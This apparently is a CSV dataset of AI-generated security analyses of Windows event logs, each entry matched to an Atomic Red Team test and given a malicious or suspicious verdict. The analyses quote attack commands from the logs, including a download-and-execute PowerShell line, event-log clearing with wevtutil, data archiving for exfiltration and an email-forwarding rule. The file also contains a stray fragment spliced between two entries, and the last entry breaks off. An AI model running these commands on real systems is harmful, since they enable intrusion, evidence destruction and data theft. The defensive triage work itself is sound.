Directory Name,AI Response
Copy a sensitive File over Administrative share with Powershell,"Based on the provided Windows event log entries, several indicators suggest potentially malicious activity:

1. **Clearing Event Logs:**
   - Security Log Event ID 1102 and System Log Event ID 104 indicate that logs were cleared by the user `admin_test` using `wevtutil.exe`. Clearing event logs is often a technique used by attackers to cover their tracks.

2. **Execution of `wevtutil.exe`:**
   - There are multiple instances of `wevtutil.exe` execution seen in the Sysmon log for clearing logs such as: 
     - `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`
     - `wevtutil.exe cl Application`
     - `wevtutil.exe cl System`
   - This command, executed with administrative privileges, is responsible for clearing logs, which aligns with the action commonly used to hide malicious activity.

3. **Unusual PowerShell Activity:**
   - The PowerShell log indicates an activity that involves the copying of a file named ""Easter_Bunny.password"" to a temporary directory using PowerShell.
   - PowerShell is often leveraged by attackers to execute scripts or commands stealthily, and the naming of the file (`Easter_Bunny.password`) further raises suspicion since it's an unusual operation likely serving no legitimate purpose.

4. **Logon and Security Context:**
   - All suspicious activities were executed by the `admin_test` user, potentially indicating credential misuse or an account compromise.

**Assessment Conclusion:**
The combination of log clearing, suspicious PowerShell usage, and the context of these activities suggest that malicious intent is likely. These activities exhibit common patterns seen in attack scenarios meant to compromise and persist on a host undetected.

**Resolution: MALICIOUS**
Given the evidence of log clearance and suspicious PowerShell activities, the behavior captured in these logs is deemed to be intentionally deceptive and harmful.

**Guidance on Proceeding:**
1. **Immediate Incident Response:**
   - Revoke access for the user `admin_test`.
   - Perform an in-depth investigation to determine the scope of the compromise and any other affected systems.

2. **Forensic Analysis:**
   - Conduct a forensic analysis on `Server002` to recover deleted logs, and check for additional Indicators of Compromise (IoCs).

3. **Review Security Settings:**
   - Strengthen security monitoring policies to detect similar events in the future.
   - Keep the security solution databases up to date to detect known malicious patterns and signatures.

4. **Security Awareness and Training:**
   - Provide training about best practices in handling privileged accounts and auditing.

The logs analyzed show a clear indication of malicious activity and necessary steps should be taken swiftly to mitigate potential damage and reinforce security protocols."
ESXi - Remove Syslog remote,"Upon reviewing the provided Windows event logs from Server002, there are clear indicators of potentially malicious activities that warrant further investigation:

### Key Findings:
1. **Event Log Clearing:** Multiple logs, including Security, System, and Windows PowerShell, were cleared using the `wevtutil` command line utility (`cl` stands for clear log) on the system by the user `admin_test`. Events clearing logs (System EventID: 104; Security EventID: 1102) can indicate an attempt to hide malicious activity or track covering attempts.

2. **Suspicious PowerShell Activity:** PowerShell logs show commands executed with `plink.exe` that are aligned with a known MITRE ATT&CK technique (T1560.001) involving ESXi host logging configuration modifications. These PowerShell activities, involving `AtomicRedTeam` payloads and SSH connections via `plink.exe`, are markers of potentially unauthorized network modifications or lateral movement preparations.

3. **Process Execution:** Sysmon logs indicate heavy usage of `wevtutil` and processes associated with log clearing, often linked with malicious activities aligning with the goal of obfuscating evidence.

4. **User and Process Behavior Anomalies:** There is an unusual level of activity in clearing logs and executing PowerShell scripts without a clear, legitimate purpose documented in the logs. This behavior by `admin_test` should be scrutinized for legitimate authorization and purpose.

### Assessment:
- The combination of cleared logs, suspicious PowerShell usage, and invoked techniques associated with malicious post-exploitation actions strongly suggests activities that are not typical for routine system operations.
- Especially, the automatic clearing of logs right after initiating suspicious PowerShell commands and interaction with potential ESXi devices could imply efforts to discretely establish unauthorized control or make system changes.

### Resolution:
- **MALICIOUS** - There is a high confidence of malicious activity due to the specific sequence of events and common indicators of compromise present in the log data.

### Guidance on How to Proceed:
1. **Containment and Investigation:**
   - Immediately isolate `Server002` from the network to prevent potential data exfiltration or pivoting to other network resources.
   - Conduct a full forensic analysis on `Server002` to determine the full extent of the compromise, focusing on any external communications or data modifications made through the suspicious PowerShell script.

2. **User Account Audit:**
   - Review the credentials and usage of `admin_test` to confirm whether these actions were conducted by an authorized user or if the account has been compromised.

3. **Policy and Control Enhancement:**
   - Enhance logging and monitoring capabilities, especially around critical administrator activities such as `wevtutil` usage and PowerShell script execution.
   - Consider implementing stricter PowerShell execution policies and monitoring solutions for real-time alerting.

4. **Communication:**
   - Report findings to the internal security team and potentially relevant cybersecurity agencies, especially if containing sensitive or regulatory data.

By following these steps, the likelihood of containing adverse effects while preparing defenses against similar attacks in the future can be improved."
Compress Data for Exfiltration With PowerShell,"After analyzing the provided Windows event logs, several indicators of potentially malicious activity can be identified:

1. **Log File Clearing:**
   - In the Security log, Event ID 1102 indicates that the security log was cleared by the user ""admin_test"" at `2024-10-28 07:42:45.5751251`. Additionally, in the System log, Event ID 104 shows the same user clearing logs from both the System and Windows PowerShell channels around the same time. The clearing of event logs is a common practice by attackers to cover tracks, especially following unauthorized activity.

2. **Unusual PowerShell Activity:**
   - The PowerShell logs indicate the execution of a PowerShell command: `dir $env:USERPROFILE -Recurse | Compress-Archive -DestinationPath $env:USERPROFILE\\T1560-data-ps.zip`. This command archives recursively from the user's profile directory, which can be indicative of data exfiltration, given the use of T1560, a known MITRE ATT&CK technique for Archive Collected Data.

3. **Privilege Escalation Indicator:**
   - Security Event ID 4672 indicates that the SYSTEM account acquired high-level privileges immediately after a logon (Event ID 4624) via the Advapi process. The acquired privileges include SeDebugPrivilege and SeBackupPrivilege, which could be leveraged for malicious activity.

4. **Process Execution:**
   - Several sysmon events are logged detailing the execution of wevtutil.exe with commands such as `wevtutil.exe cl Security`. The use of wevtutil to clear event logs aligns with activities to evade detection.

5. **Repeated Credential Access Attempts:**
   - Several instances of Event ID 5379 indicate attempts to access credentials with numerous failed returns (ReturnCode 3221226021). Although these could be benign, when considered alongside other suspicious activities, they warrant concern.

Given these observations, the activity appears consistent with an attempt by an actor to perform data exfiltration and cover their tracks. The combination of log clearing, potentially exfiltrative PowerShell command usage, and high privilege acquisition are strong indicators of malicious intent.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately isolate the affected machine to prevent any potential data exfiltration or further malicious activities.
- Initiate a detailed forensic investigation to trace back the source of compromise and assess the extent of the data potentially accessed or exfiltrated.
- Review and enhance logging and monitoring capabilities to detect similar activities in the future.
- Conduct a thorough review of user permissions and configurations to prevent unauthorized privilege escalation.
- Educate users and administrators about recognizing and reporting suspicious activities. Consider incorporating scenarios like this one into security awareness training."
Recon information for export with PowerShell,"### Detailed Analysis

Based on the given logs, let's dive into the key observations made for any suspicious activities.

#### 1. Application Log:
- The `edgeupdate` service has stopped twice, but this behavior by itself isn't necessarily suspicious unless correlated with other events indicating unwanted software modifications.
- The Software Protection Platform Service has logged an entry, which is standard and indicates the service's activity.

#### 2. System Log:
- A potentially concerning event is the clearing of logs (`EventID: 104` for System and Windows PowerShell channels), executed by the user `admin_test`. Log clearing can indicate an attempt to hide illicit activity, but it can also occur during legitimate administrative maintenance.

#### 3. Security Log:
- Again, log clearing is shown (`EventID: 1102`), which further raises suspicions about an effort to obfuscate activities, performed by `admin_test`.

#### 4. Sysmon Log:
- Numerous instances of processes related to `wevtutil.exe` (Windows Event Utility) clearing System, Security, and PowerShell logs are seen. This tool is often used for legitimate purposes but also can be employed by attackers to clear logs.
- PowerShell execution activity (EventID: 1) with `powershell.exe` running a script that gathers service, environment, and process information which aligns with a known tactic (T1119: Automated Collection). The PowerShell command redirecting output to temporary files is a behavior potentially indicative of malicious reconnaissance.
- EdgeUpdate-related processes are running extensively. While these may correlate with typical software updates, excessive or unusual EdgeUpdate command-line arguments could potentially be leveraged for exploitation, though nothing overtly malicious stands out from these logs alone.

#### 5. Windows PowerShell Log:
- The execution of a PowerShell command collecting system information is recorded (`EventID: 600`). This is consistent with reconnaissance activities.

### Conclusion and Resolution:
The series of event logs, particularly the use of `wevtutil.exe` for clearing logs and the PowerShell activity involving information gathering, are highly indicative of `suspicious` behavior, suggesting potential reconnaissance or pre-attack maneuvers.

### Resolution
- **SUSPICIOUS:** Due to the combination of:
   - Event log clearing by `admin_test` using `wevtutil.exe`.
   - Reconnaissance-focused PowerShell scripts execution, without clear justification for such actions.

### Guidance and Next Steps:
1. **Immediate Action:** 
   - Isolate the system (Server002) to prevent any further potential malicious actions or spread within the network.
   - Conduct an investigation on the user `admin_test` for any unauthorized access or behavior that deviates from standard operational practices.

2. **In-depth Analysis:**
   - Acquire and analyze additional logs, including network traffic, to understand any external communications concurrent with these events.
   - Look for any anomalies in AD access or unexpected privilege escalations.
  
3. **Preventative Measures:**
   - Harden security logging mechanisms to ensure complete tamper-proof logging.
   - Implement SIEM alerts for unusual log clearing and excessive usage of `wevtutil.exe`.

The combination of suppressed (cleared) logs and reconnaissance activity raises concerns that justify further investigation to rule out malicious intentions."
Compress Data and lock with password for Exfiltration with 7zip,"Based on the provided logs, a thorough analysis reveals several points of interest, indicating suspicious behavior:

1. **System and Security Event Logs Cleared:** 
   - The logs show that log files for the System, Application, Security, and Windows PowerShell channels were cleared by the user ""admin_test"" (Event ID 104 in System logs and Event ID 1102 in Security logs). Clearing logs can be an attempt to cover tracks, a common tactic in malicious activities.

2. **Wevtutil Utility Usage:**
   - Multiple executions of `wevtutil.exe` were logged. This utility is used for managing event logs, including clearing them, which correlates with the cleared logs above. This command line usage by the ""admin_test"" user presents a pattern, raising concerns given the subsequent log clear events.

3. **Suspicious Command Execution:**
   - An observed command involving `cmd.exe` is noteworthy: `cmd.exe /c mkdir C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1560.001\victim-files & echo ""This file will be encrypted"" > .\encrypted_file.txt & ""%%ProgramFiles%%\7-zip\7z.exe"" u archive.7z *txt -pblue & dir`. This script seems to emulate an encryption process, potentially part of a simulation or test, as indicated by the ""AtomicRedTeam"" directory (often associated with penetration testing frameworks). However, the context and intent are uncertain without further validation.

4. **Frequent Use of Command-Line Applications:**
   - Repeated use of command-line utilities like `cmd.exe`, `wevtutil.exe`, `whoami.exe`, and `HOSTNAME.EXE` might indicate manual or scripted administrative activity, typical in legitimate administrative tasks but also in unauthorized access attempts.

5. **Time Change Events:**
   - There are logged changes in system time (Event ID 4616 in Security logs). These are minor adjustments, likely related to time synchronization, but changes in system time can sometimes play a role in timestamp manipulation in coordinated attacks.

6. **High Integrity Level Processes:**
   - Several processes run with high integrity levels by the user ""admin_test"", which indicates elevated privileges. While not inherently malicious, it's worth verifying the legitimacy of these actions, particularly given the context of other suspicious behavior.

**Assessment and Resolution:** 
The observed activities, particularly the clearing of event logs and the use of `wevtutil.exe`, are strong indicators of potential malicious behavior. The additional suspicious command execution and elevated process rights support this view, although they could be part of authorized penetration tests, given the ""AtomicRedTeam"" reference. This uncertainty requires clarification from the users or administrators involved.

**Resolution:**  
- **SUSPICIOUS**: The identified activities suggest possible malicious intent or unauthorized access warranting further investigation. It is essential to confirm the purpose of these activities with involved individuals or by reviewing related documentation. Moreover, conducting a thorough scan of the host for any malicious indicators or signs of compromise would be prudent."
Utilize Clipboard to store or execute commands from,"Based on the log entries provided, here's a detailed analysis and assessment:

1. **Clearing of Event Logs:**
   - There are multiple instances in which the event logs are cleared. The security log entry with Event ID 1102 and system log entries with Event ID 104 indicate log clearance activity. This kind of behavior is often associated with attempts to hide malicious activity, as attackers typically clear logs to erase traces of their actions.

2. **Command Line Execution:**
   - There is a peculiar command line execution involving `cmd.exe` with the following command: `""cmd.exe"" /c dir | clip & echo ""T1115"" > %temp%\\T1115.txt & clip < %temp%\\T1115.txt`. This command suggests potential TTPs (Tactics, Techniques, and Procedures) associated with clipboard data manipulation, which is indicative of suspicious activity. T1115 is a MITRE ATT&CK technique related to clipboard data.

3. **Usage of Administrative Tools:**
   - Multiple benign administrative tools are executed, such as `whoami.exe`, `hostname.exe`, and `wevtutil.exe`, which by themselves are not inherently malicious. However, their frequent and sequential usage, along with the log clearance activities, suggest that these may not be regular administrative tasks.

4. **Time Anomaly:**
   - There is an event log with Event ID 4616 indicating a time change, executed by an account with a SubjectUserSid of S-1-5-19 (LOCAL SERVICE). Time changes can be suspicious, especially if they are unsanctioned or unexplained, as they can be part of attacker attempts to disrupt or evade monitoring.

5. **Integrity Level and User Context:**
   - All key activities (including process creation and log clearance) are performed with high integrity level privileges, suggesting that the actions were executed in an elevated (admin-like) context. The actions are performed by the `SERVER002\\admin_test` user, indicating this account may have been compromised.

### Assessment:
The combination of log clearance, suspicious command-line execution mimicking ATT&CK techniques, and potential time manipulation, suggests suspicious, if not malicious, intent.

### Resolution:
**MALICIOUS** - The identified activities (specifically log clearance, suspicious command execution related to clipboard data, and the elevated nature of operations) strongly indicate malicious activity.

### Guidance on How to Proceed:
- **Immediate Incident Response**: Initiate an incident response procedure, including isolating the machine to prevent further potential damage or lateral movement.
- **Examine User Accounts**: Investigate the `admin_test` account for any signs of compromise and reset credentials.
- **Restore and Monitor**: Restore the cleared logs if possible and enable enhanced monitoring on `Server002` for early detection of any new incidents.
- **Root Cause Analysis**: Conduct a thorough investigation to identify how the compromise occurred and take steps to prevent future incidents.
- **Review Security Policies**: Ensure that logging is robust, regularly backed up, and protected against unauthorized clearance."
Execute Commands from Clipboard using PowerShell,"Upon thorough examination of the provided logs, several indicators suggest potential malicious activity on the Windows host (Server002).

### Analysis:

1. **PowerShell Log Execution:**
   - The PowerShell log entries show an unusual use of the command `powershell.exe & {echo Get-Process | clip; Get-Clipboard | iex}`. This command copies the list of processes to the clipboard and then executes the contents of the clipboard. This is indicative of an attempt to obfuscate operations, as such behavior is characteristic of PowerShell-based attacks where attackers execute code from the clipboard to avoid direct logging of their commands. The use of `iex` (Invoke-Expression) to execute commands is particularly suspicious.

2. **Sysmon Log Indicators:**
   - Several Sysmon events indicate the execution of processes like `wevtutil.exe` with arguments that clear event logs (e.g., `\""C:\Windows\system32\wevtutil.exe\"" cl Application`). Clearing event logs is often an attempt to remove traces of suspicious activities from logs.
   - The high integrity level of many processes also suggests potential privilege abuse, especially since these actions were performed by the user `admin_test`.

3. **Security Log Events:**
   - In the Security logs, Event ID 1102 indicates that the security log was cleared by the user `admin_test`. Clearing security logs is a red flag, usually employed by attackers to cover their tracks.
   
4. **System and Application Logs:**
   - System log entries (Event ID 104) show that both the System and Windows PowerShell event logs were cleared by `admin_test`. Clearing logs, especially across multiple logs, signifies malicious intent.
   - The use of `wevtutil.exe` in the Sysmon logs to clear event logs correlates with these log clearing activities.

### Assessment:

- The combination of suspicious command-line execution in PowerShell, the clearing of multiple types of event logs, and obscure execution paths in Sysmon all point towards malicious activity aimed at covering tracks and potentially escalating privileges.

### Resolution:

**MALICIOUS**

Given the observed behaviors, this analysis concludes with a high confidence level that these logs are indicative of malicious activity, characterized by attempts to execute obscured commands and clear logs to eliminate forensic evidence. Immediate action should be taken to secure the system, including:
- Isolating the affected host for further forensic analysis.
- Conducting a thorough investigation of user accounts, specifically `admin_test`.
- Reviewing network traffic for additional signs of compromise.
- Implementing enhanced monitoring on related systems for similar patterns of behavior.
- Reinforcing endpoint protections – specifically PowerShell execution restrictions and log monitoring."
Office365 - Remote Mail Collected,"Upon analysis of the provided logs from the Windows host identified as ""Server002,"" several suspicious activities suggest potential malicious intent:

1. **PowerShell Activity:**
   - The PowerShell logs reveal the execution of a script that includes creating a self-signed certificate, obtaining access tokens, connecting to Microsoft Graph, and attempting to collect email messages remotely. Such activity signifies an attempt to access and potentially exfiltrate sensitive email data, consistent with techniques used for remote email collection.

2. **Sysmon Log Analysis:**
   - Multiple instances of `wevtutil.exe` usage are noted, specifically clearing event logs (`cl` command). This action is often used to cover tracks post-exfiltration or malicious activities. The logs show the `wevtutil.exe` is executed several times, clearing event logs for the System and Security logs in quick succession, indicating deliberate log tampering.
   - Observation of `conhost.exe` instances following these `wevtutil.exe` executions could be indicative of attempts to execute further commands or maintain sessions in a command-line interface.

3. **Security and System Logs:**
   - Security log Event ID 1102 indicates the Security log has been cleared, which is a critical indicator of log tampering.
   - System log Event IDs 104 also show the System log and Windows PowerShell log have been cleared, further pointing to efforts to hide potentially malicious activity.

4. **User Context and Privilege Level:**
   - The logs display actions performed under the user `admin_test` with high integrity level, suggesting potential misuse of elevated privileges, which is a common indicator of privilege escalation or a compromised administrative account.

**Assessment:**
Collectively, these activities align with typical post-exploitation actions, including the collection and exfiltration of sensitive data, followed by efforts to hide evidence through log clearance. The combination of automated email data access via PowerShell and deliberate log clearance is strongly indicative of malicious behavior.

**Resolution:**
Given the nature of the activities involving unauthorized data access and attempts to conceal operations through event log clearance, the situation is classified as **MALICIOUS**.

**Guidance:**
- Isolate the affected host (""Server002"") immediately to prevent further unauthorized access or data exfiltration.
- Conduct a thorough investigation on the `admin_test` account for signs of compromise or misuse.
- Restore event logs from backups if available, to gather more information on possible prior actions.
- Consider resetting credentials for accounts with administrative access.
- Strengthen monitoring and auditing of PowerShell logs and Sysmon events on all endpoints, alongside applying least privilege and network segmentation principles to limit potential future breaches."

6. **Engage Incident Response Teams**: If the organization has an Incident Response team or external consultant, their expertise should be engaged to handle the situation systematically.

The above actions help ensure potential threats are neutralized while fortifying the security posture against future incidents."
Compress Data for Exfiltration With Rar,"After a thorough analysis of the provided logs, the following observations stand out:

1. **Log Clearing Activity**:
   - Multiple log entries indicate that someone executed the `wevtutil` command to clear logs in the `Security`, `System`, and `Windows PowerShell` channels. Commands like `wevtutil cl Security` are indicative of a possible attempt to cover tracks after malicious actions. The user performing these actions is `SERVER002\admin_test`.

2. **Process Execution and Potential Data Exfiltration**:
   - There is a `cmd.exe` process that runs with command-line arguments `""cmd.exe"" /c ""%programfiles%/WinRAR/Rar.exe"" a -r %USERPROFILE%\T1560.001-data.rar %USERPROFILE%\*.txt""`. This suggests the zipping of user `.txt` files, which can be indicative of data staging for exfiltration (noted by the tag T1560.001 which corresponds to the data compression and encryption technique used in attacks).

3. **High Privilege Use**:
   - There is notable use of high privileges, as indicated by the presence of `SeDebugPrivilege` and other high-level privileges assigned to the `SYSTEM` account. Although SYSTEM processes often do have such privileges, their timing and correlation with other events may suggest an abuse scenario.

4. **Time Change Events**:
   - The logs contain time change events by the `LOCAL SERVICE` account, which might suggest an attempt to manipulate event timings; however, this alone does not confirm malicious intent without additional context.

5. **Use of Admin Account**:
   - The admin account `admin_test` appears to have been involved in some of the suspicious activities, such as clearing the logs and processes executing `cmd.exe`. This indicates that the account may have been compromised.

6. **Normal System Activities**:
   - There are various EdgeUpdate activities and general Windows service process startups (e.g., `svchost.exe`, `SecurityHealthService.exe`). These can be considered normal if not accompanied by other suspicious behavior.

**Assessment and Resolution**:
- Given the presence of log-clearing activities, potential data-staging or exfiltration signals, and use of administrative privileges, the activities described in the logs are indicative of potentially malicious actions. The execution of specific commands (e.g., log clearing with `wevtutil`) typically associated with nefarious intent reinforces this assessment.

**Resolution**: **MALICIOUS**

**Guidance on How to Proceed**:
1. **Immediate Actions**:
   - Isolate the affected host (Server002) from the network to prevent further actions by any attacker.
   - Inspect the admin account `admin_test` for indicators of compromise and consider resetting its credentials or disabling it temporarily.
   - Preserve evidence by collecting full disk images and memory dumps if possible, for further forensic analysis.

2. **Further Investigation**:
   - Conduct a deeper investigation to determine the full scope of the compromise and identify any other potentially compromised accounts or systems.
   - Review firewall and network logs for any exfiltration attempts aligned with the time data was staged.

3. **Remediation Plan**:
   - Reinforce monitoring and logging practices to prevent future occurrences and enhance detection capabilities.
   - Educate staff about the importance of account security and monitor accounts for abnormal activity going forward.

These steps are critical to ensuring the integrity and security of your organization's network and data assets."
Windows Screencapture,"After reviewing the provided Windows event logs, the following observations and analysis have been made:

### Summary of Findings:

1. **Clearing of Event Logs:**
   - There are events indicating that the event logs (System, Security, and Windows PowerShell) were cleared by the user `admin_test`. The events of interest include:
     - System Event ID 104: Log clearance of the System and Windows PowerShell channels.
     - Security Event ID 1102: Security log clearance.
   - Process `wevtutil.exe` was used to clear these logs. While log clearance itself is not inherently malicious, when logs are deliberately cleared, it can indicate an attempt to cover up other actions.

2. **Unusual PowerShell Commands and Process Execution:**
   - The logs indicate execution of `powershell.exe` commands. Specifically, there is a command involving `psr.exe` for step recording which may be used for reconnaissance or data capture:
     ```
     powershell.exe & {cmd /c start /b psr.exe /start /output c:\\temp\\T1113_desktop.zip /sc 1 /gui 0 /stopevent 12, 
     Add-Type -MemberDefinition '[DllImport(\""user32.dll\"")] public static extern void mouse_event(int flags, int dx, int dy, 
     int cButtons, int info);' -Name U32 -Namespace W;, [W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);, 
     cmd /c \""timeout 5 > NULL && psr.exe /stop\""}
     ```
   - The above script appears suspicious as it is being used to automate user interactions possibly for capturing user activity which aligns with T1113 (Screen Capture) tactics.

3. **High-Integrity Level Processes:**
   - There are processes running with High integrity levels such as `wevtutil.exe` and PowerShell, which typically require elevated privileges. Combined with the log clearing and unusual script execution, this suggests unauthorized or malicious use of administrative privileges.

4. **Miscellaneous Observations:**
   - Multiple instances of Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) are reported, but they do not appear directly related to the suspicious activities.

### Assessment:
The combination of log clearance, execution of potentially malicious PowerShell scripts, and use of high-integrity processes suggests an attempt to perform unauthorized actions on the system, likely indicating a compromise.

### Resolution:
- **MALICIOUS**: The activity within these logs is indicative of malicious intent. Immediate action should be taken to review the security posture of the affected system.

### Recommendations:
- **Immediate Steps:**
  - Disconnect the affected machine from the network to prevent further unauthorized activity.
  - Perform a full forensic analysis to investigate further compromises or data exfiltration.
  - Review user `admin_test` and assess if this account has been compromised.
  
- **Long-term Steps:**
  - Implement stricter access controls for administrative accounts.
  - Regularly monitor logs for unusual clearance activities.
  - Evaluate and improve network segmentation to limit the impact of compromised accounts or systems."
Collect Clipboard Data via VBA,"### Detailed Log Analysis

#### Windows PowerShell Log:
- The PowerShell log entries indicate the execution of a script using `Invoke-Expression (IEX)` to process commands fetched from an external URL (`iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing`). This is a common technique used by attackers to execute scripts from the internet without directly downloading them to disk.
- The script sets a clipboard value and executes `Invoke-Maldoc`, a known command used for testing malicious document behavior (`macroFile` related to VBA macro execution).

#### Security Log:
- Event ID 1102 suggests the security log was cleared by user `admin_test`. Log clearance is a tactic to hide malicious activities.

#### Sysmon Log:
- Multiple instances of the usage of `wevtutil.exe` to clear event logs are detected (Event ID 1). This action is typically suspicious as it's used to obscure tracks by deleting logs.
- The initiating user is consistently `SERVER002\\admin_test` with a high integrity level, indicating administrative privileges were used.
- The sequence of events suggests a potential compromise and use of PowerShell for executing potentially malicious scripts, followed by clearing of logs to hide these activities.

#### Application Log:
- The `Microsoft-Windows-Security-SPP` and `EdgeUpdate` log entries do not directly show malicious activity, but the timing aligns with suspicious activities from other logs.

#### System Log:
- Log clearance activities (Event ID 104) on multiple channels, including System and Windows PowerShell, are logged. These reinforce attempts to hide activities that could be related to previous PowerShell executions.

### Assessment
- **Suspicious or Anomalous Behavior**: The use of PowerShell to run scripts from external sources, combined with events showing log clearance attempts across multiple log channels, is highly indicative of suspicious behavior.
- **Indication of Malicious Activity**: The combination of running scripts from the internet, manipulation of clipboard contents, and clearing of system logs strongly suggests malicious intentions, consistent with techniques used in malware delivery and execution chains.

### Recommendation
Based on the analysis of these logs:

- **Resolution**: **MALICIOUS**
- **Action**: Immediately isolate the affected host (`Server002`) for a thorough forensic examination. Review user `admin_test` accounts and associated credentials for potential compromise. Ensure system and application patches are up to date to minimize the risk of exploitation. Consider restoring the system from a known clean backup if a compromise is confirmed. Engage in incident response procedures to mitigate similar threats within the network."
Azure - Enumerate Azure Blobs with MicroBurst,"### Detailed Analysis of Logs

#### Observations:

1. **Log Clearing via `wevtutil`**:
   - Multiple uses of `wevtutil.exe` to clear logs for channels such as Application, System, Security, and Windows PowerShell are observed. Clearing logs is typically done to remove traces of potentially malicious or unauthorized activity.
   - Events related to this are seen in the System logs with Event ID 104 and Security logs with Event ID 1102. The use of `wevtutil.exe` for clearing logs is confirmed in the Sysmon logs with user `SERVER002\admin_test`.

2. **Suspicious PowerShell Activity**:
   - Multiple instances of PowerShell execution are highlighted. One specific instance involves the execution of a script `Invoke-EnumerateAzureBlobs.ps1` from a non-standard location in the temp directory.
   - The command takes input from a permutations file and writes output to a temp file, which could be indicative of enumeration or exfiltration activities.
   - This execution is noticed in both the PowerShell and Sysmon logs with no apparent legitimate reason provided for such actions.

3. **Privilege Escalation and Potential Unauthorized Access**:
   - Security Log Entries with Event ID 4624 indicate possible logon activities involving the `admin_test` account via NTLM from a non-local system.
   - Event ID 4672 shows that `admin_test` was assigned several high-level privileges, which includes `SeDebugPrivilege`, `SeBackupPrivilege`, etc., typically not necessary for standard operations.

4. **System and Network-Level Changes**:
   - Observed several processes related to system updates and installations, notably involving Microsoft Edge. While some entries for Microsoft Edge installer processes are standard, there're multiple Edge Update processes running, noted in Sysmon logs, with large command-line arguments which could denote automated updates or installation scripts.

5. **Network and Task-related Processes**:
   - Usual network-related processes like `SearchProtocolHost`, `SearchFilterHost`, and services related to Windows tasks were observed running under `NT AUTHORITY\SYSTEM`. These mostly appear to be standard and expected.

#### Assessment:

- **Log Clearing**: The actions of clearing logs without backup, especially from critical channels such as Security, System, and PowerShell, are highly suspicious and usually intended to cover tracks of illicit activities.

- **PowerShell Usage**: The use of PowerShell scripts from temporary locations with potential enumeration capabilities signals malicious intent. The specific script and its use-case are often red flags pointing to reconnaissance or data gathering tasks prior to exfiltration.

- **Privilege Use**: The assignment of elevated privileges to `admin_test`, combined with access via NTLM from an external system, requires a thorough assessment to ensure they are legitimate and not indicative of compromised credentials or misuse.

#### Resolution:

- **MALICIOUS**: The cumulative activities observed point to potential malicious intent, characterized by the concealment of activities via log clearing, use of non-standard PowerShell scripts indicative of reconnaissance, and suspicious privilege assignments. Immediate action should include checking for unauthorized access, further examining system integrity, and ensuring all credentials are secured alongside potential incident response measures.

#### Guidance on Proceeding:

- Initiate an incident response process to isolate the affected host.
- Review account usage, especially for `admin_test`, for unauthorized access or privilege escalation.
- Analyze network traffic for anomalies or connections to suspicious external IPs.
- Restore and review archived logs if available for further insights.
- Strengthen security controls by applying patches, enabling log monitoring, and improving PowerShell script restrictions."
Office365 - Email Forwarding,"Based on the analysis of the provided logs, several notable events indicate potentially suspicious activity requiring further investigation.

**Suspicious Activities and Analysis:**

1. **Log Cleared Event:**
   - The `Security` log shows an event (Event ID 1102) for log clearance initiated by the user `admin_test`. The clearing of logs, especially security logs, is a significant indicator of potential malicious activity as it may imply an attempt to hide actions.

2. **PowerShell Activity:**
   - The PowerShell log indicates that a PowerShell script was executed with the purpose of connecting to `ExchangeOnline` and creating an inbox rule to forward emails to `Atomic_Operator@fakeemail.aq` using what seems to be a blank password (`ConvertTo-SecureString -AsPlainText -Force`). This behavior likely matches tactics used by attackers to maintain persistence or exfiltrate information.

3. **Event Log Clearing via `wevtutil`:**
   - Multiple instances of `wevtutil.exe` being executed to clear different logs (Sysmon, Application, System) by the user `admin_test` are recorded in the Sysmon log. The use of this utility to clear logs is typically associated with attempting to cover up malicious actions.

4. **Unsuccessful Credential Access Attempts:**
   - Events with Event ID 5379 show multiple failed attempts to access credentials using an invalid target name, which returned a `ReturnCode` indicating access denied (3221226021). These could indicate attempts to access or use credentials improperly.

5. **Usage of High-Integrity Tools:**
   - The use of `C:\\Windows\\System32\\whoami.exe` and `C:\\Windows\\System32\\HostName.exe` alongside high-integrity levels can indicate privilege reconnaissance or environmental probing.

6. **Privilege Assignments:**
   - Event ID 4672 shows a privilege escalation where several powerful privileges (such as `SeDebugPrivilege`, `SeSecurityPrivilege`) were enabled for `SYSTEM` account. This is notable but may normally occur during legitimate operations.

**Risk Assessment and Conclusion:**

- **Risk**: The sequence and type of events strongly suggest that someone with elevated privileges, likely `admin_test`, was executing and/or scripting tasks to cover actions, attempt credential access, and monitor or redirect communications.

- **Threats**: There is a significant risk of compromised user credentials, data exfiltration, or other unauthorized activity being obscured by log manipulation and clearing.

**Resolution Suggestion: SUSPICIOUS**

- While the activities are indicative of malicious intent, without further contextual information, they cannot yet be confidently declared as outright malicious. However, they are suspicious enough to warrant immediate further investigation.

**Guidance:**

1. **Commence an in-depth forensic investigation** to trace the source and intent behind the actions performed, focusing on the `admin_test` account and the PowerShell activities.

2. **Review any associated network logs** and email logs for signs of data exfiltration or unauthorized access to Exchange services.

3. **Identify additional logs or sources** that the user might have accessed, and correlate activities across different systems.

4. **Check for signs of unauthorized privilege use** and revert any unnecessary elevated privileges.

5. **Implement stricter monitoring and alerting** for reoccurrences of such activities, especially focusing on:
   - Log clearances
   - Use of administrative tools (`wevtutil`, `PowerShell`)
   - Suspicious email rules creation or modification
   
By addressing these concerns promptly, the organization can ensure a stronger security posture and mitigate potential risks associated with this suspicious activity."
Email Collection with PowerShell Get-Inbox,"Upon analyzing the logs provided, several key observations surface that could indicate potential malicious activity:

1. **Powershell Execution with Bypass Execution Policy**: 
   - The usage of `powershell.exe -executionpolicy bypass` is a common technique used by attackers to execute scripts without execution policy restrictions. The script `Get-Inbox.ps1` is being executed from a temporary directory, which is a red flag as attackers often write malicious scripts to temporary locations.
   - Multiple instances of PowerShell processes executing scripts from directories under `AtomicRedTeam`, which implies the potential testing of attack techniques.

2. **Event Log Clearing**: 
   - The Security Event Log (EventID 1102) and System Log (EventID 104) have been cleared. This is a significant indicator of malicious activity, as attackers often clear logs to hide traces of their activities. The logs were cleared by the user `SERVER002\admin_test`, which is the same account executing suspicious activities.
   
3. **Excessive Use of Wevtutil**: 
   - The command line utility `wevtutil.exe` is observed accessing various event log channels excessively (e.g., `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Windows PowerShell`). This might relate to reading or clearing logs.

4. **Atomic Red Team Artifacts**: 
